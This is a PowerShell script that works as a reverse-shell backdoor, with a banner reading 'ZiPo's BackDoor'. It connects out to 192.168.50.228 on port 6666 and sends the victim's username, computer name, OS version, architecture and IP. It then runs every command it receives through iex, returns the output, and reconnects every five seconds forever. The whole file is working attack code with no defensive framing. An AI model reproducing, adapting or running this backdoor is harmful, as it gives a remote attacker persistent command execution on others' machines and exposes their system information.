function Connect-Back {
    $endpoint = "192.168.50.228"
    $port = 6666

    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($endpoint, $port)
            if ($client.Connected) {
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}

                # Очистка экрана
                $esc = [char]27
                $clear = "$esc[2J$esc[H"
                $stream.Write([System.Text.Encoding]::ASCII.GetBytes($clear), 0, $clear.Length)
                $stream.Flush()

                # Баннер
                $banner = @"
   ________  .__              __________                .___           
   \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
    |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
    |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
   /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
           \/        \/\/                                      \/    \/ 
             ZiPo's BackDoor Connected
"@

                $sysinfo = @"
Username: $env:USERNAME
Computer: $env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Architecture: $env:PROCESSOR_ARCHITECTURE
IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)

---------------------------------------------------
"@

                $intro = "$banner`n$sysinfo"
                $introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
                $stream.Write($introBytes, 0, $introBytes.Length)
                $stream.Flush()

                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
                    $sendback = (iex $data 2>&1 | Out-String )
                    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()
                }

                $stream.Close()
                $client.Close()
            }
        }
        catch {
            Start-Sleep -Seconds 5  # Переподключение каждые 5 сек
        }
    }
}

Connect-Back
